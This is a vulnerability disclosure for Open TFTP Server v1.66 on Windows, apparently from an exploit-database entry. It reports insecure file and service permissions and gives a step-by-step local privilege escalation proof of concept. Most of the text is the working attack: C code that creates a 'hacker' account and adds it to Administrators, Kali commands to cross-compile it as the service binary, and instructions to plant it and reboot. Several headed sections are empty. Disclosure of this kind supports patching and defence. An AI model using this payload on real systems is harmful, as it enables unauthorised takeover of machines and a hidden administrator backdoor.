Vulnerability Details:
  On Windows, Open TFTP Server v1.66, suffers from insecure file & folder permissions. This allows a low-privilge, local attacker to escalate their permissions to Administrator; by replacing the 'TFTPServer' service binary with a maliciously-crafted, binary executable. The TFTP Server runs as an 'Auto_Start' Service, with 'LocalSystem' priviledges, after the default installation. After the attacker has planted the malicious binary, the code will be executed with System priviledges on the next boot of the windows device. See PoC below for details.

## Service Information (there is also an Unquoted Service Path)

## Insecure Folder Permission

## Insecure File/Service Permission

## Local Privilege Escalation Proof of Concept
#0.  Download & install 

#1.  Create low privileged user & change to the user
  C:\Users\lowPrivUser>net user lowprivuser | findstr /i "Membership Name" | findstr /v "Full"
  User name                    lowPrivUser
  Local Group Memberships      *Users
  Global Group memberships     *None
  C:\>whoami
  mycomputer\lowprivuser 

#2.  Move the Service EXE to a new name

#3.  Create malicious binary on kali linux
  1) Download dependencies
   root@kali# apt install gcc-mingw-w64-i686 wine64 -y
  2) Add Admin User C Code
   root@kali# cat addAdmin.c
   #include<windows.h>
   int main(void){
    system("net user hacker mypassword /add");
    system("net localgroup Administrators hacker /add");
    WinExec("C:\\OpenTFTPServer\\~OpenTFTPServerSP.exe",0);
    return 0;
   }
  3) Compile Code
   root@kali# i686-w64-mingw32-gcc addAdmin.c -l ws2_32 -o OpenTFTPServerSP.exe

#4. Transfer created 'OpenTFTPServerSP.exe' to the Windows Host 

#5. Move the created 'OpenTFTPServerSP.exe' binary to the 'C:\OpenTFTPServer\' Folder

#6. Reboot the Computer

#7. Look at that new Admin
